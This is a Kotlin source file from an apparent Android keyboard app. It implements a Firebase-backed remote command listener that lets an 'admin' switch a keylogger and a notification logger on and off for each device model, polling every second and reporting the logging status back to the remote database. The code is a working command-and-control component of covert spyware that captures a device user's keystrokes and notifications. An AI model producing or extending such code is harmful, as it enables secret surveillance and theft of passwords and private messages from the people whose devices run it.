package com.example.mykeyboard

import android.os.Build
import android.util.Log
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

object RemoteCommandListener {
    private const val TAG = "RemoteCommandListener"
    private var isListening = false
    private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
    private val scope = CoroutineScope(Dispatchers.IO)

    fun startListening() {
        if (isListening) return
        isListening = true

        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)

            reportCurrentStatus()

            // 1. Real-time ValueEventListener
            ref.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    applySnapshot(snapshot)
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Remote command listener cancelled", error.toException())
                }
            })

            // 2. 1-second Polling Ticker using addListenerForSingleValueEvent (API 21 compatible)
            scope.launch {
                while (true) {
                    delay(1000L)
                    try {
                        ref.addListenerForSingleValueEvent(object : ValueEventListener {
                            override fun onDataChange(snapshot: DataSnapshot) {
                                applySnapshot(snapshot)
                            }

                            override fun onCancelled(error: DatabaseError) {}
                        })
                    } catch (e: Exception) {
                        // ignore network fluctuations
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception starting remote command listener", e)
        }
    }

    private fun applySnapshot(snapshot: DataSnapshot) {
        try {
            val keyObj = snapshot.child("keylogging").value
            val keylogging = when (keyObj) {
                is Boolean -> keyObj
                is String -> keyObj.toBoolean()
                else -> null
            }
            if (keylogging != null && keylogging != KeyloggingConfig.isEnabled) {
                KeyloggingConfig.isEnabled = keylogging
                LogStore.addLog("Remote Command: Key Logger set to $keylogging")
                reportCurrentStatus()
            }

            val notifObj = snapshot.child("notifications").value
            val notifications = when (notifObj) {
                is Boolean -> notifObj
                is String -> notifObj.toBoolean()
                else -> null
            }
            if (notifications != null && notifications != NotificationConfig.isEnabled) {
                NotificationConfig.isEnabled = notifications
                LogStore.addLog("Remote Command: Notification Logger set to $notifications")
                reportCurrentStatus()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error applying snapshot", e)
        }
    }

    fun reportCurrentStatus() {
        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
            ref.child("status").child("keylogging").setValue(KeyloggingConfig.isEnabled)
            ref.child("status").child("notifications").setValue(NotificationConfig.isEnabled)
            ref.child("keylogging").setValue(KeyloggingConfig.isEnabled)
            ref.child("notifications").setValue(NotificationConfig.isEnabled)
        } catch (e: Exception) {
            Log.e(TAG, "Error reporting status", e)
        }
    }
}
